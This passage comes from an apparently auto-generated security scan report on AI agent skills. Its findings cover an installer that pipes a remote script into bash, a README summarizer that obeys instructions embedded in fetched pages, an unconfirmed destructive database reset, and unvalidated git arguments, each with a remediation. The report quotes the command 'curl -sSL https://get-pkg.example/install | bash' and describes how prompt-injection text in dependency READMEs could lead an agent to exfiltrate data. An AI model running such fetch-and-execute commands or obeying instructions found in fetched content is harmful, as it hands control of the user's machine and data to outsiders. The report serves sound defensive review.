  - Remediation: Do not use 'curl | bash' for installation. Replace it with installation through an official package manager or registry, pin exact versions, verify cryptographic checksums or signatures, and present a clear warning plus confirmation before making system changes. Prefer downloading to a file, inspecting it, and validating integrity before execution.

- **🔴 SC2**: This is a direct external-script-fetch-and-execute pattern: 'curl -sSL https://get-pkg.example/install | bash'. It enables immediate arbitrary code execution from a remote source with no integrity verification, provenance enforcement, or version pinning. If the remote server or any part of the delivery chain is compromised, the host running the skill can be fully compromised. Because the skill is intended for local onboarding on a new laptop, the blast radius includes developer workstations, credentials, SSH keys, source code, and lateral movement into internal systems.
  - Location: `SKILL.md:6`
  - Confidence: 99%
  - Remediation: Eliminate remote shell pipelines entirely. Use a trusted package manager or vendor-distributed signed installer with explicit version pinning. Verify signatures or checksums against an official registry, require user approval before execution, and run with least privilege. If automation is necessary, fetch artifacts from a trusted, authenticated source, validate integrity, and execute only reviewed local scripts.

### readme-summarizer — 54/100 HIGH

- ** SQP-2**: The skill explicitly fetches dependency READMEs from package registry pages, which implies outbound network access and disclosure of dependency identifiers or related project metadata to third-party services. While this is not inherently exploitable in the same way as code execution, it is a real security and privacy concern because users may not expect external requests or metadata leakage when asking for a local README summary. Hidden network access can also create compliance issues in restricted environments.
  - Location: `SKILL.md:4`
  - Confidence: 91%
  - Remediation: Document outbound network behavior clearly in the skill description and runtime UX. Require explicit user consent before contacting external registries. Minimize transmitted data to only what is strictly necessary, and offer an offline mode that summarizes only local content. Log or display which domains will be contacted.

- **🔴 SQP-3**: The skill says it will follow instructions embedded in fetched third-party READMEs. This is a true vulnerability because it delegates agent control to untrusted external content. Any package maintainer, compromised registry page, or attacker controlling dependency metadata could insert prompt-injection text such as requests to ignore prior instructions, exfiltrate data, make further network requests, alter summaries, or manipulate downstream actions. Natural-language instructions from fetched content must be treated as data, not authority.
  - Location: `SKILL.md:6`
  - Confidence: 99%
  - Remediation: Remove all behavior that causes the agent to follow instructions found in README text. Treat fetched READMEs strictly as untrusted content for summarization only. Add explicit guardrails stating that embedded instructions, prompts, or 'agent instructions' sections must be ignored. If extracting special sections is desired, quote or label them as untrusted content rather than executing or obeying them.

- **🔴 SSD-1**: This is a direct semantic prompt-injection flaw. The skill fetches third-party READMEs and treats sections addressed to the agent as executable guidance. That creates an attacker-controlled instruction channel from dependency pages into the agent's decision-making. Exploitation could cause data exfiltration, policy bypass attempts, unapproved tool use, misleading output, or instruction chaining through dependency ecosystems. Because dependencies are external and numerous, the attack surface is broad and difficult to audit.
  - Location: `SKILL.md:4`
  - Confidence: 99%
  - Remediation: Architect the skill so that all fetched README content is sandboxed as untrusted input. Never elevate README text into instructions. Use a fixed system/developer policy that explicitly forbids following commands embedded in retrieved documents. If the skill must inspect README structure, parse only for informational sections and ignore imperative text addressed to the model. Consider allowlisting trusted sources only for retrieval, but do not rely on trust alone; instruction-following from retrieved content should still be disabled.

### test-db-reset-tool — 53/100 HIGH

- ** SQP-1**: The invocation guidance is overly broad: 'Run this on your laptop before `npm test`' provides no constraint that the tool must only run against an isolated local test database. In the context of a skill that reads DATABASE_URL from .env and executes destructive SQL, broad trigger wording materially increases the chance of accidental execution in unsafe contexts, including when .env still targets staging. This is a real safety vulnerability because ambiguous invocation conditions can lead directly to unintended destructive actions.
  - Location: `SKILL.md:13`
  - Confidence: 86%
  - Remediation: Constrain invocation explicitly: require a dedicated test environment, document exact preconditions, and refuse to run unless the target is verified as local/test-only. Add exclusion conditions such as 'never run if host is remote/shared' and require an explicit confirmation or flag like --force-reset-test-db.

- **🔴 SQP-2**: The skill documents destructive database reset behavior but lacks a prominent warning section despite explicitly acknowledging that DATABASE_URL may still point to a shared staging database. Because it performs DROP TABLE ... CASCADE without confirmation, omission of a clear risk warning is dangerous and can lead to irreversible data loss in non-test environments. In this context, the missing warning is not a mere documentation issue; it materially increases the likelihood of catastrophic operator error.
  - Location: `SKILL.md:3`
  - Confidence: 98%
  - Remediation: Add a highly visible warning section stating that the tool destroys data and must only be used against disposable local test databases. Require hard safety checks before execution: verify environment name, enforce localhost/known test host allowlists, block known staging/production hosts, require a dedicated TEST_DATABASE_URL instead of DATABASE_URL, and require explicit user confirmation or a one-time override flag.

- ** EA2**: Executing destructive SQL 'without confirmation' is a true vulnerability here. The tool autonomously performs irreversible DROP TABLE operations and explicitly notes it may act on a shared staging database if .env is misconfigured. Removing human confirmation and safety interlocks around destructive actions dramatically raises the risk of accidental data destruction. Given the database context, this can wipe important shared environment data immediately.
  - Location: `SKILL.md:7`
  - Confidence: 99%
  - Remediation: Introduce mandatory safety interlocks: require explicit confirmation showing the resolved database host/name, add a dry-run mode, require a --yes or equivalent destructive flag, and abort unless the target is positively identified as a local disposable test database. Prefer transactional test isolation strategies or ephemeral test databases instead of dropping shared tables directly.

- **🔴 PE3**: Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.
  - Location: `SKILL.md:5`
  - Confidence: 60%
  - Remediation: Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.

- **🔴 PE3**: Code accesses credential files (SSH keys, AWS credentials, etc.). This could indicate credential theft attempts.
  - Location: `SKILL.md:7`
  - Confidence: 60%
  - Remediation: Remove references to credential paths. Use environment variables or secrets managers. For docs, use placeholder paths (e.g., /path/to/config). Never load .env or token files in production code paths.

### changelog-generator — 51/100 HIGH

- ** LP3**: The skill description indicates shell-capable behavior ('reads commit history since the last git tag' and uses a script to collect commits) but no permissions are declared. This is a real security issue because undeclared shell access reduces transparency and can allow the skill to execute git or other system commands without explicit review. In a changelog generator, shell usage may be expected for git operations, but the lack of declaration means consumers cannot accurately assess the skill's runtime capabilities. If implemented unsafely, shelling out around commit data, tags, or repository state could also expose the environment to command injection or unintended file/system access.
  - Location: `SKILL.md:1`
  - Confidence: 76%
  - Remediation: Explicitly declare the required permissions/capabilities for shell or git access in the skill metadata. Narrow the scope to the minimum needed, such as read-only repository access if supported. Avoid arbitrary shell execution; prefer direct library/API calls for git operations instead of shell commands. If shelling out is unavoidable, use fixed command invocations, avoid interpolating untrusted data, validate inputs such as tag names and paths, and document the exact commands the skill may run.

- **🔴 OH1**: Model output is used without validation or sanitization. Unvalidated output injected into downstream contexts (SQL, shell, HTML) enables injection attacks and arbitrary code execution.
  - Location: `scripts/collect_commits.py:5`
  - Confidence: 95%
  - Remediation: Validate and sanitize all model output before using it in downstream contexts. Use parameterized queries for SQL, shell quoting for commands, and HTML encoding for web output.

- **🔴 OH1**: This call uses range_spec built from unvalidated output of a prior git command. In a hostile or attacker-controlled repository, a crafted tag name can influence the semantics of the git log invocation because git parses revision arguments specially. Although this is not shell injection, it is still an output-to-command injection issue at the application level: untrusted repository metadata is used as a control argument to another command. Potential consequences include causing the command to fail, selecting an unintended commit range, or in edge cases making git interpret the argument as an option-like token or surprising revision expression. In the context of a changelog generator, that can produce misleading or incomplete changelogs and can break automation pipelines. The skill context makes this somewhat more dangerous because it is expected to run against arbitrary repositories where attackers may control tag names.
  - Location: `scripts/collect_commits.py:11`
  - Confidence: 82%
  - Remediation: Do not construct revision arguments directly from untrusted tag output without validation. Validate last_tag against a strict allowed pattern such as semantic-version tags, or resolve and verify it as a ref before use. Reject tag names beginning with '-' or containing whitespace or unexpected revision metacharacters. Use check=True on subprocess.run, handle failures explicitly, and consider safer git plumbing commands or ref-qualified syntax to avoid ambiguous revision parsing.



*Generated by SkillSpector v2.3.13*